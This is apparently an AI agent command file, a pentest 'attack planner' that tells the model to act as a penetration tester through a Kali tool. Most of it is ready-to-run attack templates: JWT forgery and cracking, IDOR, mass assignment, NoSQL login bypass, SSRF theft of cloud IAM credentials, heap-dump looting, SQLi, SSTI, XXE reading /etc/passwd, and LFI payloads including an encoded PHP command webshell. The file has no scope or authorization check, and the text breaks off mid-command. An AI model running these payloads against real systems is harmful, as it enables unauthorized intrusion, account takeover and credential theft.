---
description: Signal-driven attack planner — reads observations + prior findings, maps tech stack signals to targeted attack vectors with chain exploitation reasoning. Never bulk scans blindly.
argument-hint: <observations: tech stack, auth method, endpoints seen, IDs visible, role fields, anomalies>
allowed-tools: [mcp__kali-pentest__execute_kali_command]
---

# pt — Pentest Attack Planner

You are a senior penetration tester. Read the observations in `$ARGUMENTS`, correlate with existing findings, identify attack signals, select targeted vectors, and execute them with human-level reasoning.

**Core rules:**
- Every command must be justified by a specific observed signal
- Read what's already been tested before picking new vectors
- Recognize chains: two medium findings often make one critical
- Apply the impact gate after every result — only document confirmed impact

---

## Step 0 — Context: Read What Already Exists

Before selecting any vectors, read the engagement state:

```bash
echo "=== Engagement Context ==="
cat /home/kali/current/notes/engagement.md 2>/dev/null | head -100 || echo "[no active engagement — run /pt-init first]"
echo ""
echo "=== PoC files already saved ==="
ls /home/kali/current/poc/requests/ 2>/dev/null || echo "(none)"
echo ""
echo "=== Recon available ==="
ls /home/kali/current/recon/http/ 2>/dev/null
ls /home/kali/current/recon/dns/ 2>/dev/null
```

Extract from the output:
- `TARGET` — the engagement target
- Previously confirmed findings (don't re-test what's already confirmed)
- What recon data is available to inform attack decisions

---

## Step 1 — Parse Observations & Map to Vectors

Read `$ARGUMENTS` carefully. Identify every signal present. Map **only** the signals you actually see to their attack vectors — never run a vector without a matching signal.

Present selected vectors as a numbered list with one-line reasoning before executing:
> "I see [signal] → testing [vector] because [specific reason]"

### Complete Signal → Attack Vector Table

| Signal observed | Attack vector | Priority |
|----------------|--------------|----------|
| JWT / Bearer token in auth | JWT: decode → alg:none → claim tamper → crack secret | **HIGH** |
| Numeric or UUID IDs in API paths/responses | IDOR: path param, query param, body param; all HTTP verbs | **HIGH** |
| `role`, `admin`, `is_admin`, `permissions`, `user_type` in response body | Mass assignment + vertical privilege escalation | **HIGH** |
| MongoDB / CouchDB / Firebase / DynamoDB signals | NoSQL injection: `$gt`, `$ne`, `$where`, `$regex` operators in auth/filter params | **HIGH** |
| `url=`, `webhook=`, `callback=`, `redirect=`, `fetch=`, `src=` param | SSRF: cloud metadata, internal services, protocol wrappers | **HIGH** |
| GraphQL endpoint discovered | Introspection, alias batching (IDOR at scale), mutation abuse, field suggestions | **HIGH** |
| CORS / cross-origin AJAX requests visible | CORS misconfiguration: reflected origin, null origin bypass, credentialed cross-origin | **HIGH** |
| JSON body accepted on any endpoint | Prototype pollution: `__proto__`, `constructor.prototype`, `__defineGetter__` | **HIGH** |
| Multiple API versions visible (v1, v2, v3) | API version abuse: old versions often lack auth middleware — test v1 with current token | **HIGH** |
| Spring Boot stack | Actuator endpoint dump: `/actuator/env` (creds), `/actuator/heapdump` (in-memory secrets) | **HIGH** |
| Template engine (Jinja2/Thymeleaf/Twig/Freemarker/Pebble/Velocity/Smarty) | SSTI: engine-specific probes, escalate to RCE | **HIGH** |
| File upload endpoint | MIME bypass, double extension, null byte, path traversal in filename, XXE in SVG/DOCX | **HIGH** |
| `next=`, `return=`, `redirect_uri=` OAuth param | Open redirect → OAuth token theft via redirect_uri bypass + token-in-fragment | **HIGH** |
| SSRF already confirmed finding | SSRF escalation: AWS IMDS v2 token exchange, GCP metadata, Azure IMDS, internal port scan | **HIGH** |
| Search / filter / query / id parameter | SQLi: sqlmap with level 3, SSTI probes, NoSQL operators | **HIGH** |
| Keycloak IAM in tech stack | ROPC grant test, realm enumeration, client_secret in JS bundle | **MEDIUM** |
| WordPress CMS | wpscan: users, plugins, themes, CVEs, config backup | **MEDIUM** |
| PHP stack visible | LFI: `../../etc/passwd`, `php://filter/convert.base64-encode`, `data://`, RFI | **MEDIUM** |
| Admin panel / login form | Default credentials (hydra), username enumeration via timing/message diff | **MEDIUM** |
| `403 Forbidden` on interesting path | 403 bypass: `X-Forwarded-For`, `X-Original-URL`, path case, double encode, `..;/` | **MEDIUM** |
| XML input / `Content-Type: application/xml` / SOAP | XXE injection: entity injection, OOB via DNS/HTTP, parameter entities | **MEDIUM** |
| File download / `path=` / `file=` / `include=` param | Path traversal: Linux/Windows payloads, encoded variants | **MEDIUM** |
| `Content-Type: application/x-www-form-urlencoded` on state-changing action | CSRF: check SameSite, CSRF token presence, forge cross-site form | **MEDIUM** |
| Login / rate-limited endpoint | Rate limit bypass: `X-Forwarded-For` rotation, email+1 suffix, JSON array of passwords | **MEDIUM** |
| Response has `admin: false` / `role: user` / `active: true` booleans | Response manipulation: intercept with Burp, flip boolean, check if server trusts client | **MEDIUM** |
| Error response with stack trace / framework info in 500 | Error disclosure: probe with `null`, `-1`, `{}`, `[]`, oversized strings to extract stack | **MEDIUM** |
| Two confirmed findings that relate | **Chain exploitation**: IDOR + JWT = account takeover; SSRF + CORS = exfiltration; LFI + upload = RCE | **CRITICAL** |
| OAuth / `redirect_uri` in flow | redirect_uri bypass, state fixation, CSRF on auth callback, implicit flow token leakage | **MEDIUM** |
| Coupon/redeem/transfer/vote/like endpoint with counter or balance | Race condition: 20 simultaneous identical requests — counter exceeds limit, coupon applied >1x, balance goes negative | **HIGH** |
| Java stack trace, `.ser` upload accepted, `viewstate` in forms, `X-Java-Serialized-Object` header, pickle/marshal in Python response | Deserialization: ysoserial CommonsCollections1 → OOB DNS callback → confirm RCE; python-deserialization for pickle/yaml/marshal | **HIGH** |
| HTTP response has both `Transfer-Encoding: chunked` and `Content-Length` headers, or server accepts TE header variants — load balancer / reverse proxy in front of app | HTTP Request Smuggling: CL.TE / TE.CL — run `/pt-web` for smuggler.py automated detection + manual timing probes | **HIGH** |
| Response headers change based on `X-Forwarded-Host`, `X-Host`, or `X-Forwarded-Server` — CDN/cache layer present (`X-Cache: HIT`, `Age:` header visible) | Web Cache Poisoning: inject OAST/canary via unkeyed headers, verify second request (without header) returns poisoned response — run `/pt-web` Phase 2 | **HIGH** |
| Subdomain CNAME resolves to external service (GitHub Pages, S3, Heroku, Netlify, Fastly, Azure, Shopify) | Subdomain Takeover: check if the external service account is unclaimed → register it → serve content on subdomain — run `/pt-web` Phase 3 | **HIGH** |
| WebSocket connection (`ws://` or `wss://`) in app traffic, JS source, or real-time feature (chat, live prices, notifications, collaboration) | WebSocket: test origin bypass (cross-site WebSocket hijacking), auth-less connection, IDOR via channel/room subscribe, XSS via message injection — run `/pt-web` Phase 4 | **HIGH** |
| `%0d%0a` / `%0a` / `%E5%98%8A%E5%98%8D` not stripped in redirect or URL param; redirect parameter (next=, return=, url=) present | CRLF injection: inject `Set-Cookie` header (session fixation → account takeover) + response splitting — run `/pt-web` Phase 5 | **MEDIUM** |
| Spring EL (`#{...}`), OGNL (`%{...}`), Struts2 stack, expression language error in response, JSP-based app | EL/OGNL injection: `${7*7}` / `%{7*7}` in all string params — Struts2 CVEs (CVE-2017-5638, CVE-2018-11776), Spring EL RCE if SpEL evaluates user input | **HIGH** |
| Resource IDs in UUID format | UUID version check: v1 IDs are time-based and predictable — run `/pt-logic` Phase 2B for adjacent UUID generation; v4 = random (not directly predictable, but test indirect IDOR patterns) | **MEDIUM** |
| Exposed `.git`, `.env`, `backup.zip`, source maps (`*.js.map`), AWS/Stripe/Google API keys in JS or error responses | Leaked secrets: run `/pt-secrets` — full exposed-file hunt, trufflehog scan, API key validation (AWS STS, Stripe, OpenAI, SendGrid) | **HIGH** |
| Any API endpoint not yet parameter-fuzzed | `arjun` parameter discovery (GET + POST) | **LOW** |
| API base path not yet enumerated | `ffuf` endpoint fuzzing with API wordlist | **LOW** |
| API endpoint with only GET documented | Verb tampering: test POST/PUT/PATCH/DELETE — missing auth on other verbs | **LOW** |

---

## Step 2 — Execute Vectors (in priority order)

For each selected vector, use these exact command templates. Every command block re-declares `TARGET`, `TOKEN`, etc. at the top.

---

### JWT Attacks

```bash
TOKEN=<token_from_observation>
ENG=/home/kali/current

# 1. Decode — inspect every claim (user_id, role, sub, admin, scope, exp)
python3 /opt/jwt_tool/jwt_tool.py $TOKEN 2>/dev/null | head -50

# 2. alg:none attack — unsigned token with original claims
python3 /opt/jwt_tool/jwt_tool.py $TOKEN -X a 2>/dev/null | head -20

# 3. Claim tamper — modify role/admin/user_id
# Run interactively (Claude: copy the tampered token and re-test the endpoint manually)
python3 /opt/jwt_tool/jwt_tool.py $TOKEN -T 2>/dev/null | head -30

# 4. RS256 → HS256 confusion (if RSA public key available)
python3 /opt/jwt_tool/jwt_tool.py $TOKEN -X k -pk /tmp/public.pem 2>/dev/null | head -10

# 5. Crack the secret (run async for large wordlists)
python3 /opt/jwt_tool/jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt 2>/dev/null | tail -10
```

After decoding: note every claim. Each modifiable field (`role`, `user_id`, `sub`, `admin`, `scope`, `email`) is an attack surface — verify the claim is actually enforced server-side.

**Impact gate**: Does the server accept the tampered/unsigned token and return different data? → Confirmed JWT vulnerability. Escalate: can you impersonate other users by changing `sub`?

---

### IDOR / BOLA Testing

```bash
TARGET=<target>
TOKEN=<your_valid_token>
OTHER_ID=<another_user_id>  # Try: 1, 2, 3, admin's known ID, UUID of another account

# Path parameter IDOR
curl -sk -X GET "https://$TARGET/api/users/$OTHER_ID" \
    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null

curl -sk -X GET "https://$TARGET/api/users/$OTHER_ID/profile" \
    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null

# Query parameter IDOR
curl -sk "https://$TARGET/api/profile?user_id=$OTHER_ID" \
    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null

# Body parameter IDOR (PUT/PATCH)
curl -sk -X PUT "https://$TARGET/api/users/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"user_id\": $OTHER_ID, \"email\": \"attacker@evil.com\"}" | python3 -m json.tool 2>/dev/null

# Verb tampering on same ID endpoint
for method in GET POST PUT PATCH DELETE; do
    code=$(curl -sk -X $method "https://$TARGET/api/users/$OTHER_ID" \
        -H "Authorization: Bearer $TOKEN" -o /dev/null -w "%{http_code}")
    echo "$method /api/users/$OTHER_ID → $code"
done
```

**Impact gate**: Does the response contain another user's name, email, PII, payment info, or any non-public data? → Confirmed IDOR. Document immediately.

**Chain check**: If JWT claims contain `user_id` → combine JWT tamper + IDOR = impersonate arbitrary user account takeover.

---

### Mass Assignment / Privilege Escalation

```bash
TARGET=<target>
TOKEN=<token>

# Inject privilege fields into any update/register endpoint
curl -sk -X PUT "https://$TARGET/api/users/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name":"test","admin":true,"role":"admin","is_admin":1,"permissions":["admin","superuser"],"user_type":"admin","is_superuser":true,"verified":true}' \
    | python3 -m json.tool 2>/dev/null

# Verify: did the role change?
curl -sk "https://$TARGET/api/users/profile" \
    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null

# Try on registration endpoint
curl -sk -X POST "https://$TARGET/api/register" \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker@evil.com","password":"Test1234!","admin":true,"role":"admin"}' \
    | python3 -m json.tool 2>/dev/null
```

**Impact gate**: Does a subsequent GET show `role: admin` or `admin: true`? → Confirmed mass assignment. Then re-test HIGH-priority vectors with elevated privileges.

---

### NoSQL Injection

```bash
TARGET=<target>

# MongoDB auth bypass — login with operator injection
curl -sk -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":{"$gt":""},"password":{"$gt":""}}' | python3 -m json.tool 2>/dev/null

# $ne null bypass
curl -sk -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":{"$ne":null}}' | python3 -m json.tool 2>/dev/null

# $regex to enumerate users
curl -sk -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":{"$regex":"^admin"},"password":{"$gt":""}}' | python3 -m json.tool 2>/dev/null

# $where blind injection (timing-based)
curl -sk -X POST "https://$TARGET/api/filter" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"filter":{"$where":"sleep(3000)"}}' --max-time 10 2>/dev/null
echo "Exit code: $? (124=timeout = blind NoSQLi confirmed)"

# URL-encoded form injection
curl -sk -X POST "https://$TARGET/api/login" \
    -d 'email[$gt]=&password[$gt]=&submit=Login' | head -20
```

**Impact gate**: Returned auth token or user data without correct credentials? Timing delay on `$where`? → Confirmed NoSQL injection. Extract all documents.

---

### CORS Misconfiguration

```bash
TARGET=<target>
TOKEN=<token>
# Test every API endpoint that returns user data

# 1. Reflected origin — server mirrors back the Origin
response=$(curl -skI "https://$TARGET/api/users/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Origin: https://evil.com")
echo "$response" | grep -i "access-control"
echo "$response" | grep -qi "evil.com" && echo "[CORS HIT] Origin reflected — credentialed CORS possible"

# 2. Null origin bypass (sandbox/file:// context)
curl -skI "https://$TARGET/api/users/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Origin: null" | grep -i "access-control"

# 3. Subdomain wildcard check
curl -skI "https://$TARGET/api/users/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Origin: https://evil.$TARGET" | grep -i "access-control"

# 4. ACAO: * with credentials (misconfiguration)
curl -skI "https://$TARGET/api/users/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Origin: https://attacker.com" | grep -iE "access-control-allow-origin|access-control-allow-credentials"
```

**Impact gate**: `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true`? → Critical CORS misconfiguration. An attacker's website can steal authenticated API responses via `fetch()` with `credentials: 'include'`.

---

### Prototype Pollution

```bash
TARGET=<target>
TOKEN=<token>

# Inject __proto__ into any JSON body endpoint
curl -sk -X POST "https://$TARGET/api/users/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"__proto__":{"admin":true,"role":"admin","isAdmin":true}}' \
    | python3 -m json.tool 2>/dev/null

# Via constructor.prototype
curl -sk -X POST "https://$TARGET/api/settings" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"constructor":{"prototype":{"admin":true}}}' \
    | python3 -m json.tool 2>/dev/null

# Verify — does a subsequent request reflect polluted properties?
curl -sk "https://$TARGET/api/users/me" \
    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null

# URL query string pollution (hpp-style)
curl -sk "https://$TARGET/api/search?__proto__[admin]=true&query=test" \
    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null
```

**Impact gate**: Response or subsequent requests show `admin: true` or elevated role? → Confirmed prototype pollution. Escalate to RCE if template engine processes polluted properties.

---

### API Version Abuse

```bash
TARGET=<target>
TOKEN=<your_low_priv_token>

# Test current endpoints on older API versions
for version in v0 v1 v2 v3 v4 v5 v2018 v2019 v2020; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
        "https://$TARGET/api/$version/admin/users" \
        -H "Authorization: Bearer $TOKEN")
    echo "/$version/admin/users → $code"
done

# Try without auth on older versions
for version in v1 v2 v3; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/api/$version/users")
    echo "/$version/users (no auth) → $code"
done

# Test admin endpoints on all versions
for version in v1 v2; do
    curl -sk "https://$TARGET/api/$version/admin/users" \
        -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null | head -20
done
```

**Impact gate**: Older API version returns admin data or responds to unauthenticated requests? → Confirmed authorization bypass via API versioning.

---

### SSRF

```bash
TARGET=<target>
TOKEN=<token>
PARAM=<url_param_name>
ENDPOINT=<endpoint>

# AWS EC2 instance metadata (IMDSv1)
curl -sk -X POST "https://$TARGET/$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -d "{\"$PARAM\":\"http://169.254.169.254/latest/meta-data/\"}" | head -30

# AWS IMDSv2 (requires token exchange — two step)
TOKEN_RESP=$(curl -sk -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
curl -sk "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
    -H "X-aws-ec2-metadata-token: $TOKEN_RESP" 2>/dev/null

# GCP metadata
curl -sk -X POST "https://$TARGET/$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -d "{\"$PARAM\":\"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\"}" \
    -H "Metadata-Flavor: Google" | head -20

# Azure IMDS
curl -sk -X POST "https://$TARGET/$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -d "{\"$PARAM\":\"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"}" \
    -H "Metadata: true" | head -20

# Internal port scan via SSRF (detect by response time/size difference)
for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
    code=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" -X POST "https://$TARGET/$ENDPOINT" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d "{\"$PARAM\":\"http://127.0.0.1:$port/\"}")
    echo "  127.0.0.1:$port → HTTP $code"
done

# DigitalOcean metadata
curl -sk -X POST "https://$TARGET/$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -d "{\"$PARAM\":\"http://169.254.169.254/metadata/v1/\"}" | head -10
```

**Impact gate**: Server returns cloud metadata or responds from internal ports? → Confirmed SSRF. Chain: extract IAM credentials from metadata → pivot to cloud account takeover.

---

### SQL Injection

```bash
TARGET=<target>
TOKEN=<token>
ENDPOINT=<endpoint>
PARAM=<param>
ENG=/home/kali/current

# Quick manual probes first (check for errors / delays)
for probe in "'" '"' "1 OR 1=1" "1' OR '1'='1" "1; SELECT SLEEP(3)--"; do
    echo "=== Probe: $probe ==="
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$probe'))")
    curl -sk --max-time 10 "https://$TARGET/$ENDPOINT?$PARAM=$encoded" \
        -H "Authorization: Bearer $TOKEN" 2>/dev/null | head -5
done

# SQLmap — GET parameter
sqlmap -u "https://$TARGET/$ENDPOINT?$PARAM=1" \
    -H "Authorization: Bearer $TOKEN" \
    --batch --level=3 --risk=2 \
    --output-dir=$ENG/scans/sqlmap/ 2>/dev/null | tail -20

# SQLmap — POST JSON body
sqlmap -u "https://$TARGET/$ENDPOINT" \
    --data="{\"$PARAM\":\"1\"}" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    --batch --level=3 --risk=2 \
    --output-dir=$ENG/scans/sqlmap/ 2>/dev/null | tail -20
```

---

### SSTI Probes

```bash
TARGET=<target>
TOKEN=<token>
ENDPOINT=<endpoint>
PARAM=<param>

# Polyglot probes — correct exit-code-based detection (no bash quoting bug)
echo "=== SSTI probe: $PARAM on $ENDPOINT ==="
for payload in '{{7*7}}' '${7*7}' '#{7*7}' '<%= 7*7 %>' '{{7*"7"}}' '*{7*7}' '${{"a"}}' '#set($x=7*7)$x'; do
    encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
    result=$(curl -sk --max-time 8 "https://$TARGET/$ENDPOINT?$PARAM=$encoded" \
        -H "Authorization: Bearer $TOKEN" 2>/dev/null)
    if echo "$result" | grep -qE "\b49\b|7777777"; then
        echo "[SSTI HIT] $payload → expression evaluated in response"
        echo "   Response snippet: $(echo "$result" | grep -oE '.{0,40}(49|7777777).{0,40}' | head -2)"
    else
        echo "  $payload → no match"
    fi
done

# POST body version (for JSON APIs)
for payload in '{{7*7}}' '${7*7}'; do
    result=$(curl -sk --max-time 8 -X POST "https://$TARGET/$ENDPOINT" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d "{\"$PARAM\":\"$payload\"}" 2>/dev/null)
    echo "$result" | grep -qE "\b49\b" && echo "[SSTI HIT via body] $payload"
done
```

**Impact gate**: Response contains `49` or `7777777` (evaluation result)? → SSTI confirmed. Use `/pt-payloads` to get engine-specific RCE payloads.

---

### GraphQL

```bash
TARGET=<target>
TOKEN=<token>

# Full schema introspection
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"query":"{ __schema { types { name kind fields { name type { name kind } } } } }"}' \
    | python3 -m json.tool 2>/dev/null | head -80

# IDOR via GraphQL query
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"query":"{ user(id: 1) { id email name role creditCards { number } } }"}' \
    | python3 -m json.tool 2>/dev/null

# Alias batching — IDOR at scale + rate limit bypass
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"query":"{ u1: user(id:1){email role} u2: user(id:2){email role} u3: user(id:3){email role} u4: user(id:4){email role} u5: user(id:5){email role} }"}' \
    | python3 -m json.tool 2>/dev/null

# Mutation abuse — try to modify other users
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"query":"mutation { updateUser(id: 2, role: \"admin\") { id role } }"}' \
    | python3 -m json.tool 2>/dev/null

# Field suggestion attack (disabled introspection bypass)
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"query":"{ us }"}' | grep -i "suggest\|Did you mean" | head -10
```

---

### Spring Boot Actuator

```bash
TARGET=<target>
TOKEN=<token>
ENG=/home/kali/current

# Discover exposed actuator endpoints
curl -sk "https://$TARGET/actuator" -H "Authorization: Bearer $TOKEN" \
    | python3 -m json.tool 2>/dev/null | tee $ENG/scans/nuclei/actuator.txt | head -30

# Environment dump — contains credentials, API keys, DB passwords
curl -sk "https://$TARGET/actuator/env" -H "Authorization: Bearer $TOKEN" \
    | python3 -m json.tool 2>/dev/null \
    | grep -iE '"password"|"secret"|"key"|"token"|"credential"|"url"' | head -30

# Heap dump — in-memory secrets, session tokens, credentials
curl -sk "https://$TARGET/actuator/heapdump" \
    -H "Authorization: Bearer $TOKEN" \
    -o $ENG/loot/heapdump.bin 2>/dev/null
[ -s $ENG/loot/heapdump.bin ] && {
    echo "[heapdump] $(du -h $ENG/loot/heapdump.bin | cut -f1) downloaded"
    strings $ENG/loot/heapdump.bin | grep -iE "password|secret|Bearer |key|token" | grep -v "//\|<!-\|\.java\|\.class" | head -20
}

# Routes — full endpoint mapping
curl -sk "https://$TARGET/actuator/mappings" -H "Authorization: Bearer $TOKEN" \
    | python3 -m json.tool 2>/dev/null | grep -oE '"pattern":"[^"]*"' | head -30

# Beans — all Spring beans (reveals internal architecture)
curl -sk "https://$TARGET/actuator/beans" -H "Authorization: Bearer $TOKEN" \
    | python3 -m json.tool 2>/dev/null | grep '"aliases"' | wc -l
```

---

### CSRF

```bash
TARGET=<target>
# Check for CSRF protections on state-changing endpoints

# 1. Check SameSite cookie attribute
curl -skI "https://$TARGET/api/login" 2>/dev/null | grep -i "set-cookie\|samesite"

# 2. Check for CSRF token in forms
curl -sk "https://$TARGET/account/settings" \
    -H "Authorization: Bearer $TOKEN" 2>/dev/null | grep -iE "csrf|_token|authenticity_token" | head -5

# 3. Test: does state-changing action work without CSRF token?
curl -sk -X POST "https://$TARGET/api/users/email" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Origin: https://evil.com" \
    -H "Referer: https://evil.com" \
    -d "email=attacker%40evil.com" \
    -b "session=<your_session_cookie>" | head -20

# 4. Check if JSON content type blocks CSRF (some frameworks only protect form-encoded)
curl -sk -X POST "https://$TARGET/api/users/email" \
    -H "Content-Type: application/json" \
    -H "Origin: https://evil.com" \
    -d '{"email":"attacker@evil.com"}' \
    -b "session=<your_session_cookie>" | head -20
```

**Impact gate**: State-changing action succeeds without CSRF token and with cross-origin headers? → Confirmed CSRF. Impact: account takeover, data modification from attacker's website.

---

### Rate Limit Bypass

```bash
TARGET=<target>

# Baseline — does the endpoint rate limit?
echo "=== Baseline: 10 rapid requests ==="
for i in $(seq 1 10); do
    curl -sk -o /dev/null -w "%{http_code}\n" -X POST "https://$TARGET/api/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"test@test.com","password":"wrong"}'
done

# Bypass attempt 1: X-Forwarded-For rotation
echo ""
echo "=== X-Forwarded-For rotation ==="
for i in $(seq 1 5); do
    code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "https://$TARGET/api/login" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: 10.0.0.$i" \
        -H "X-Real-IP: 10.0.0.$i" \
        -d '{"email":"test@test.com","password":"wrong"}')
    echo "  IP 10.0.0.$i → $code"
done

# Bypass attempt 2: Email variation (+ suffix)
echo ""
echo "=== Email variation bypass ==="
for i in $(seq 1 5); do
    code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "https://$TARGET/api/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"admin+$i@target.com\",\"password\":\"wrong\"}")
    echo "  admin+$i → $code"
done

# Bypass attempt 3: JSON array of passwords (some APIs accept arrays)
curl -sk -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":["password","123456","admin","Password1"]}' | head -10
```

---

### Error Disclosure Mining

```bash
TARGET=<target>
TOKEN=<token>
ENDPOINT=<endpoint>
PARAM=<param>

# Trigger errors to extract stack traces and framework info
for probe in "null" "-1" "{}" "[]" "true" "undefined" "$(python3 -c "print('A'*5000)")" "0x00" "../../../etc/passwd"; do
    echo "=== Probe: $probe ==="
    curl -sk --max-time 8 "https://$TARGET/$ENDPOINT?$PARAM=$probe" \
        -H "Authorization: Bearer $TOKEN" 2>/dev/null \
        | grep -iE "error|exception|stack|trace|line|file|at com\.|at org\.|sql|syntax|ORA-|1064" \
        | head -10
    echo ""
done

# POST body errors
curl -sk -X POST "https://$TARGET/$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -d '{"id":null,"data":{"$invalid":true}}' 2>/dev/null | head -20
```

**Impact gate**: Stack trace, internal file paths, SQL errors, or framework version visible? → Confirmed information disclosure. Note for chain exploitation — SQL error = likely SQLi target, Java stack = identify framework version for CVE lookup.

---

### LFI (PHP)

```bash
TARGET=<target>
TOKEN=<token>
ENDPOINT=<endpoint>
PARAM=<param>

for payload in \
    "../../etc/passwd" \
    "....//....//etc/passwd" \
    "..%2F..%2Fetc%2Fpasswd" \
    "%252e%252e%252fetc%252fpasswd" \
    "php://filter/convert.base64-encode/resource=/etc/passwd" \
    "php://filter/read=string.rot13/resource=/etc/passwd" \
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+" \
    "/etc/passwd%00" \
    "....\/....\/etc/passwd"; do
    result=$(curl -sk --max-time 8 "https://$TARGET/$ENDPOINT?$PARAM=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")" \
        -H "Authorization: Bearer $TOKEN" 2>/dev/null)
    if echo "$result" | grep -qE "root:|daemon:|bin:|nobody:"; then
        echo "[LFI CONFIRMED] $payload"
        echo "$result" | head -5
    fi
done
```

**Chain**: If LFI confirmed + file upload exists → write webshell to upload directory → include it via LFI = RCE.

---

### 403 Bypass

```bash
TARGET=<target>
TOKEN=<token>
BLOCKED=<blocked_path>  # e.g. "admin" or "internal/api"

echo "=== 403 bypass attempts on /$BLOCKED ==="
base="https://$TARGET"

# Header-based bypasses
curl -sk -o /dev/null -w "X-Forwarded-For: 127.0.0.1    → %{http_code}\n" "$base/$BLOCKED" -H "X-Forwarded-For: 127.0.0.1"
curl -sk -o /dev/null -w "X-Original-URL                → %{http_code}\n" "$base/" -H "X-Original-URL: /$BLOCKED"
curl -sk -o /dev/null -w "X-Rewrite-URL                 → %{http_code}\n" "$base/" -H "X-Rewrite-URL: /$BLOCKED"
curl -sk -o /dev/null -w "X-Custom-IP-Authorization     → %{http_code}\n" "$base/$BLOCKED" -H "X-Custom-IP-Authorization: 127.0.0.1"
curl -sk -o /dev/null -w "X-Host: localhost              → %{http_code}\n" "$base/$BLOCKED" -H "X-Host: localhost"

# Path variation bypasses
curl -sk -o /dev/null -w "/$BLOCKED/                    → %{http_code}\n" "$base/$BLOCKED/"
curl -sk -o /dev/null -w "/$BLOCKED/.                   → %{http_code}\n" "$base/$BLOCKED/."
curl -sk -o /dev/null -w "/./$BLOCKED                   → %{http_code}\n" "$base/./$BLOCKED"
curl -sk -o /dev/null -w "/%2f$BLOCKED                  → %{http_code}\n" "$base/%2f$BLOCKED"
curl -sk -o /dev/null -w "/$BLOCKED%20                  → %{http_code}\n" "$base/$BLOCKED%20"
curl -sk -o /dev/null -w "/..;/$BLOCKED                 → %{http_code}\n" "$base/..;/$BLOCKED"
# Case variation
curl -sk -o /dev/null -w "/$(echo $BLOCKED | tr a-z A-Z)  → %{http_code}\n" "$base/$(echo $BLOCKED | tr a-z A-Z)"
```

---

### XXE (XML / SVG / DOCX)

```bash
TARGET=<target>
TOKEN=<token>
ENDPOINT=<endpoint>

# Classic XXE
curl -sk -X POST "https://$TARGET/$ENDPOINT" \
    -H "Content-Type: application/xml" \
    -H "Authorization: Bearer $TOKEN" \
    -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>' \
    | grep -E "root:|daemon:|nobody:" | head -5

# SSRF via XXE (OOB — use Burp Collaborator or interactserver.io if available)
curl -sk -X POST "https://$TARGET/$ENDPOINT" \
    -H "Content-Type: application/xml" \
